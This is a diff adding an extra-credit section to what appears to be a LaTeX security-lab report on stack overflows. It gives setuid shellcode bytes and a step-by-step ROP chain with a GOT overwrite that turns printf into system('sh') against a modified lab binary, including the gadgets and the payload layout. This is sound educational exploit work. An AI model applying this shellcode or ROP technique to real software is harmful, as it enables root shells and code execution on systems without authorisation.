@@ -67,4 +67,101 @@ void vuln(char* name,char* val)
 \end{lstlisting}
 \subsubsection { Non-Executable Stack }
 When compiled with default option of non-executable stack region the memory pages allocated for stack space are set without execute permissions which means that an exception is generated if the CPU tries to read code from those memory locations. Running the exploit with this feature causes it to generate a Segmentation Fault. This is yet another mitigation technique. It is also easy to circumvent since stack data is still under attacker control and the exploit would just need to use portions of the executable's code segment. The attack can be identical to the one discussed against non-PIE executables with ASLR. \\
-\newpage
+\subsection {Extra Credit}
+\subsubsection{ Real and Effective UIDs }
+To set the real UID to to 0(root) a \emph{setuid} system call needs to be performed before the shellcode that executes the terminal. The code in \lstref{lst:suid_asm} executes the system call by setting \emph{\%eax} to \emph{0x17} and \emph{\%ebx} to \emph{0x0}. This code in hex converts to the 8 bytes in \lstref{lst:suid_hex} that are prepended to the 24 byte shellcode in the exploit. Runnig this modified exploits results in successful modification of the UID to root before the execution of the shell.
+\begin{lstlisting}[caption={Setuid assembly syscall},
+label={lst:suid_asm},
+language=,
+frame=single]
+xor %ebx, %ebx
+xor %eax, %eax
+mov %al , 0x17
+int 0x80
+\end{lstlisting}
+\begin{lstlisting}[caption={Setuid disassembled},
+label={lst:suid_hex},
+language=,
+frame=single]
+31 DB 31 C0 B0 17 CD 80
+\end{lstlisting}
+\subsubsection { Defeating ASLR and non-executable stack }
+An exploit based on ROP gadgets\cite{rops} is developed for exploiting a slightly modified version of \emph{stack.c}. To make it The modification includes a \emph{printf} call with the string \emph{"sh"}. The source is provided in the \emph{stack-help.c} file which is compiled with only stack guard disabled. This is to simplify the exploit but is unnecessary if a further technique of custom stack creation is used. The exploit uses the fact that the code segment of the executable is always in know address spaces and sets up a stack that redirects execution to sequences of instructions that end with an \emph{ret} instruction. Thanks to the variable instruction size CISC architecture of x86 it is also possible to jump in the middle of instructions and reinterpret the data as different instructions. A tool called \emph{ropper}\cite{ropper} is used to list useful instruction sequences called ROP gadgets. When a function to a dynamically linked library is called the code calls the fixed PLT entry of the function. This PLT entry is responsible for loading the location of the dynamic function into the Global Offset Table (GOT) and then branching to the stored entry in that table. The goal of the exploit would be to overwrite the \emph{printf} entry with the \emph{system} function offset and then set up a \emph{printf} call with the string \emph{"sh"} as argument effectively calling \emph{system("sh")}. From disassembling the executable we obtain the printf@PLT address that is \emph{0x08048390} and the GOT entry \emph{0x0804a000}. We also use \emph{nm} to view the difference of offset between \emph{printf} and \emph{system} in \emph{libc}.
+\begin{lstlisting}[caption={Libc symbols},
+label={lst:libc_sym},
+language=,
+frame=single]
+nm -D /lib/i386-linux-gnu/libc.so.6 
+...
+0003f430 W system
+...
+0004ced0 T printf
+...
+\end{lstlisting}
+The difference between \emph{printf} and \emph{system} is \emph{0xffff2560}, which is important to be negative as it will be included in the exploit which needs to include no null bytes. The ROP gadgets found in the code that would be used ar listed in \lstref{lst:gadgets}. 
+\begin{lstlisting}[caption={List of used gadgets},
+label={lst:gadgets},
+language=,
+frame=single]
+Gadget A:  
+	0x0804847e: 
+		add dword ptr [ebx + 0x5d5b04c4], eax; ret;
+
+Gadget B:  
+	0x08048593: 
+		mov eax, dword ptr [esp + 0x34]; 
+		mov dword ptr [esp + 4], eax; 
+		call dword ptr [ebx + esi*4 - 0xe0]; 
+		add esi, 1; cmp esi, edi; 
+		jne 0x588; add esp, 0x1c; 
+		pop ebx; pop esi; pop edi; pop ebp; ret; 
+
+Gadget C:  
+	0x080485ac: 
+		pop ebx; pop esi; pop edi; pop ebp; ret; 
+
+Gadget D:
+	0x08048378: 
+		pop ebx; ret; 
+\end{lstlisting}
+Gadget C and D allow direct control over \emph{\%ebx} \emph{\%esi} \emph{\%edi} and \emph{\%epb}, Gadget A allows for modification of an arbitrary memory address. We would use that gadget to add the difference between \emph{printf} and \emph{system} to the \emph{printf} GOT entry. To control \emph{\%eax} we need to use gadget B which has the caveat of having to call a function that does not modify \emph{\%eax} and needs \emph{\%esi+1 == \%edi}. To get a function address that does not modify \emph{\%eax} we use the dynamic linking entry for function \emph{\_fini}. Which executing the program in \emph{gdb} and listing the DYNAMIC section lets us determine that is stored in \emph{0x08049f3c}. Furthermore \emph{\_fini} needs a non-zero value in location 0x0804a024 in order to do nothing. We can use gadget A to add the initial non-zero \emph{\%eax} to that location. Finally we determine to set \emph{\%esi=0x01020101} \emph{\%edi=0x01020102} and \emph{\%ebx=0x03fc9c18} in order to satisfy all condition for executing this complex gadget. Finally we determine the location of the string \emph{"sh"} to be \emph{0x0804862a} and we note that we should execute a \emph{printf} call to initialise the GOT entry. \\
+the final Exploit is executed in this order :
+\begin{enumerate}
+\item call printf@PLT with "sh" argument
+\item use gadget D to pop the leftover "sh" pointer
+\item use gadget D to set \%ebx to 0xaaa99b60 which used by gadget A would modify 0x0804a024
+\item use gadget A to modify 0x0804a024 to non-zero
+\item use gadget C to set \%esi = 0x01020101 \%edi = 0x01020102 \%ebx = 0x03fc9c18
+\item use gadget B to set \%eax = 0xffff2560 and \%ebx = 0xaaa99b3c which used in gadget A would modify 0x0804a000
+\item use gadget A to modify the printf GOT entry 0x0804a000 with its diference to system
+\item call printf@PLT with "sh" as argument which effectively calls system("sh")
+\end{enumerate}
+Taking into account the specifics of calling the gadgets and PLT functions the exploit should look like \lstref{lst:aslr_hex}. All the 32-bit data should be encoded in Little-endian. While this exploit relies on the \emph{"sh"} string being present a modified version could create it in global variable memory by a series of \emph{strcpy} instruction from program memory for each byte. In fact with this technique a custom stack can be created and then pivoted to using a \emph{leave} \emph{ret} instruction sequence.
+\begin{lstlisting}[caption={ASLR exploit data},
+label={lst:aslr_hex},
+language=,
+frame=single]
+| 36 junk bytes to reach saved return
+| printf@PLT address
+| gadget D address
+| "sh" address
+| gadget D address
+| 0xaaa99b60 ( new ebx )
+| gadget A address
+| gadget C address
+| 0x03fc9c18 (new ebx )
+| 0x01020101 (new esi)
+| 0x01020102 (new edi)
+| 4 junk bytes (new ebp)
+| gadget B address
+| 28 junk bytes 
+| 0xaaa99b3c (new ebx)
+| 4 junk bytes (new esi)
+| 4 junk bytes (new edi)
+| 4 junk bytes (new ebp)
+| gadget A address
+| printf@PLT address
+| 0xffff2560 (new eax) for gadget B
+| address of string "sh"
+\end{lstlisting}
+
